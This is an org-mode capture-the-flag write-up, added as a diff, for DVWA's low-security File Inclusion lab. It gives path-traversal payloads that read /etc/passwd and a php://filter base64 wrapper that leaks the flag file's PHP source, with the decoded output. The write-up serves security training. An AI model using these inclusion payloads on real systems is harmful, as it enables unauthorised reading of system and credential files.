@@ -1,0 +1,85 @@
+#+TITLE: DVWA - File Inclusion Low
+#+AUTHOR: Leonardo Tamiano
+
+* Goal
+  The objective is to read all five famous quotes from
+  ~../hackable/flags/fi.php~ using only the file inclusion.
+  
+* Description
+  We have a ~div~ with three different links and by clicking on them we
+  display different files within the webapp. To display a given file
+  we use the following GET request
+
+  #+begin_example
+GET /vulnerabilities/fi/?page=file1.php HTTP/1.1
+Host: evil
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/fi/?page=include.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=6jfjn0keu8uc3cijtk2hs3a505; security=low
+Connection: close
+
+  #+end_example
+  
+* Solution
+  The idea is that by changing the name of the file within the ~page~
+  parameter to an arbitrary file on the target we're able to read its
+  contents. So we can read the etc passwod file with the following GET
+
+  #+begin_example
+http://evil/vulnerabilities/fi/?page=../../../../../etc/passwd
+  #+end_example
+
+  if we want to leak some php code then we need to use php filters to
+  convert in base64 the php code
+
+  #+begin_example
+http://evil/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+  #+end_example
+
+  and with this we can leak the ~fi.php~ file
+
+  #+begin_example
+http://evil/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/hackable/flags/fi.php
+  #+end_example
+
+  which gives us the following base64 payload
+
+  #+begin_example
+PD9waHAKCmlmKCAhZGVmaW5lZCggJ0RWV0FfV0VCX1BBR0VfVE9fUk9PVCcgKSApIHsKCWV4aXQgKCJOaWNlIHRyeSA7LSkuIFVzZSB0aGUgZmlsZSBpbmNsdWRlIG5leHQgdGltZSEiKTsKfQoKPz4KCjEuKSBCb25kLiBKYW1lcyBCb25kCgo8P3BocAoKZWNobyAiMi4pIE15IG5hbWUgaXMgU2hlcmxvY2sgSG9sbWVzLiBJdCBpcyBteSBidXNpbmVzcyB0byBrbm93IHdoYXQgb3RoZXIgcGVvcGxlIGRvbid0IGtub3cuXG5cbjxiciAvPjxiciAvPlxuIjsKCiRsaW5lMyA9ICIzLikgUm9tZW8sIFJvbWVvISBXaGVyZWZvcmUgYXJ0IHRob3UgUm9tZW8
+  #+end_example
+
+  that, when decoded, turns out to be this php code
+
+  #+begin_src php
+<?php
+
+if( !defined( 'DVWA_WEB_PAGE_TO_ROOT' ) ) {
+	exit ("Nice try ;-). Use the file include next time!");
+}
+
+?>
+
+1.) Bond. James Bond
+
+<?php
+
+echo "2.) My name is Sherlock Holmes. It is my business to know what other people don't know.\n\n<br /><br />\n";
+
+$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
+$line3 = "--LINE HIDDEN ;)--";
+echo $line3 . "\n\n<br /><br />\n";
+
+$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
+echo base64_decode( $line4 );
+
+?>
+
+<!-- 5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. -->
+  #+end_src
+
